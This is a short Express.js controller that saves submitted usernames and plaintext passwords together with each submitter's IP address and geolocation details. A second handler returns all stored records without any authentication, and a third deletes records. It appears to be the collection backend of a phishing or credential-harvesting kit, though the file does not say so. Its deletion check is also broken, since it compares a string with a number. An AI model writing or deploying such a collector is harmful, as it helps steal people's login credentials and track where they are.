let det = require("../models/details.js");
exports.addToDetails = async (req, res) => {
  const {
    password,
    ip,
    city,
    country,
    loc,
    org,
    date,
    username,
    region,
    timezone,
  } = req.body;

  det.details.push({
    username,
    password,
    ip,
    country,
    city,
    loc,
    date,
    org,
    region,
    timezone,
  });
  await det.save();
  // Return the detail object.
  res.json(det);
};

exports.getDetails = async (req, res) => {
  res.json(det.details);
};
exports.deleteDetail = async (req, res) => {
  const detailIndex = req.query.index;
  // Delete and return the details
  if (detailIndex !== -1) {
    det.details.splice(detailIndex, 1);
    await det.save();
    res.json(det.details);
  }
};
